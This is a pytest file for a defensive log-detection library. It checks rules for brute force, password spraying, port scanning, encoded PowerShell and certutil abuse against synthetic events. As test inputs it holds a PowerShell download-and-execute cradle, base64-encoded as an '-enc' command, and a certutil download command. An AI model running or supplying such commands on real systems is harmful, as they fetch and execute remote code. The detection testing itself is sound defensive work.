import base64

import pandas as pd

from detection.authentication import (brute_force, password_spray,
                                      success_after_failures)
from detection.network import port_scanning
from detection.powershell import decode_utf16, encoded_powershell
from detection.process import suspicious_process_execution


def _df(rows):
    return pd.DataFrame(rows)


def _auth(i, status, src, user, ts):
    return {"_id": str(i), "timestamp": ts, "event_type": "authentication",
            "status": status, "source_ip": src, "username": user,
            "hostname": "WS01", "command": None}


def test_brute_force_fires():
    df = _df([_auth(i, "failure", "198.51.100.7", "admin", f"2026-10-02T10:0{i}:00+00:00")
              for i in range(6)])
    out = brute_force(df, {"window_minutes": 10, "threshold": 5})
    assert len(out) == 1 and out[0]["mitre_id"] == "T1110.001"
    assert out[0]["repeat_count"] >= 5


def test_brute_force_below_threshold():
    df = _df([_auth(1, "failure", "198.51.100.7", "admin", "2026-10-02T10:00:00+00:00")])
    assert brute_force(df, {"window_minutes": 10, "threshold": 5}) == []


def test_password_spray_distinct_accounts():
    users = ["u1", "u2", "u3", "u4", "u5", "u6"]
    df = _df([_auth(i, "failure", "203.0.113.5", u, f"2026-10-02T10:0{i}:00+00:00")
              for i, u in enumerate(users)])
    out = password_spray(df, {"window_minutes": 10, "distinct_accounts": 5})
    assert len(out) == 1 and len(out[0]["extra"]["targeted_accounts"]) >= 5


def test_success_after_failures():
    rows = [_auth(i, "failure", "192.0.2.9", "admin", f"2026-10-02T10:0{i}:00+00:00")
            for i in range(4)]
    rows.append(_auth(9, "success", "192.0.2.9", "admin", "2026-10-02T10:05:00+00:00"))
    out = success_after_failures(_df(rows), {"window_minutes": 15, "failure_threshold": 3})
    assert len(out) == 1 and out[0]["severity"] == "critical"


def test_encoded_powershell_decodes_utf16le():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/a.ps1')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    df = _df([{"_id": "1", "timestamp": "2026-10-02T10:00:00+00:00",
               "event_type": "powershell", "hostname": "WS30",
               "command": f"powershell -nop -enc {enc}"}])
    out = encoded_powershell(df, {})
    assert out and out[0]["extra"]["decoded_command"] == payload
    assert decode_utf16("!!!not-base64") is None


def test_port_scanning():
    rows = [{"_id": str(p), "timestamp": f"2026-10-02T10:{p//60:02d}:{p%60:02d}+00:00",
             "event_type": "network", "source_ip": "198.51.100.50",
             "destination_ip": "10.1.20.10", "destination_port": str(1 + p * 200),
             "hostname": None, "username": None, "command": None} for p in range(25)]
    out = port_scanning(_df(rows), {"window_minutes": 10, "distinct_ports": 20})
    assert len(out) == 1 and out[0]["mitre_id"] == "T1046"


def test_lolbin_detection():
    df = _df([{"_id": "1", "timestamp": "2026-10-02T10:00:00+00:00",
               "event_type": "process", "hostname": "WS40",
               "process": "certutil.exe", "parent_process": "cmd.exe",
               "command": "certutil -urlcache -f http://x y.dll",
               "source_ip": None, "username": None}])
    out = suspicious_process_execution(df, {})
    assert len(out) == 1 and out[0]["mitre_id"] == "T1218"
